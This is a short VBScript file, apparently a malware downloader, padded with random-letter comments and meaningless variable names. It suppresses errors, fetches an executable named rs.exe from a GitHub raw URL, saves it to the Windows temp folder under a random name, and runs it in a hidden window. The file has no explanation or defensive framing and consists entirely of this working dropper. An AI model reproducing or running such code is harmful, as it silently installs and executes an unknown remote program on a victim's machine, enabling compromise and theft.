' TRTzu VzGCegyrXNBfsNZCykksgAfuUduOBSENgaieEtAXoY
On Error Resume Next
' rkXcHMkVdfEETSJAMWviJKsqsSKxlzzSOjeXmXvAYVPwczXJliPuekQPXq
Dim xbskgqb,ymykiec,zjykaf,amiapd,bprkmwo,cnwwjh
' mENuIrHUSyTgfuWqXSCv
Set xbskgqb = CreateObject("MSXML2.ServerXMLHTTP")
xbskgqb.Open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
xbskgqb.Send
' ZCpBnBpXjsUCWcHbsgLycDRtiMrXVLudrHjAJsfMevbXsEYDpAPgc
If xbskgqb.Status = 200 Then
  Set ymykiec = CreateObject("ADODB.Stream")
  ymykiec.Type = 1
  ymykiec.Open
  ymykiec.Write xbskgqb.ResponseBody
  Set zjykaf = CreateObject("Scripting.FileSystemObject")
  amiapd = zjykaf.GetSpecialFolder(2)
  bprkmwo = amiapd & "\kAVk1oda.exe"
  ymykiec.SaveToFile bprkmwo, 2
  ymykiec.Close
  Set cnwwjh = CreateObject("WScript.Shell")
  cnwwjh.Run bprkmwo, 0, False
End If
' xiSzkEqVMebONkxGNqrFzoEFWGeHSJiJBnY
Set xbskgqb = Nothing
' SzEXosjXoMHpdIIXoRwvgdpFCYTvrfZYc
